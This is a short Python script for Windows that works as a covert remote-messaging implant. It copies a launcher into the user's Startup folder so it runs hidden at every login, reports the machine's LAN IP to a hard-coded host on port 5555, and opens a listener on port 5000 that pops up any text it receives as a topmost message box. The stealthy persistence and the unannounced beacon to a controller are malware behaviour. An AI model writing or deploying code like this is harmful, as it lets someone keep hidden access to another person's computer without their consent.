import ctypes
import socket
import threading
import os

startup_folder = os.path.join(
    os.environ["APPDATA"],
    r"Microsoft\Windows\Start Menu\Programs\Startup"
)

with open(os.path.join(startup_folder, "b.bat"), "w") as f:
    f.write("pythonw " + __file__)

os.system("pip install requests")

import requests

# --- Get your real LAN IP ---
def get_local_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
    finally:
        s.close()
    return ip

requests.post("http://192.168.0.219:5555/", data=get_local_ip())

# --- Message Box function ---
def send_message(msg):
    ctypes.windll.user32.MessageBoxW(0, msg, "Message", 0x40000)

# --- TCP server ---
def handle_client(client_socket):
    with client_socket:
        message = client_socket.recv(1024).decode()
        print(f"Received: {message}")
        send_message(message)

def server_loop():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind(("0.0.0.0", 5000))
    server.listen(5)
    print("Listening on port 5000...")

    try:
        while True:
            client_socket, addr = server.accept()
            print(f"Connection from {addr}")
            threading.Thread(target=handle_client, args=(client_socket,)).start()
    except KeyboardInterrupt:
        print("Shutting down.")
    finally:
        server.close()

if __name__ == "__main__":
    server_loop()
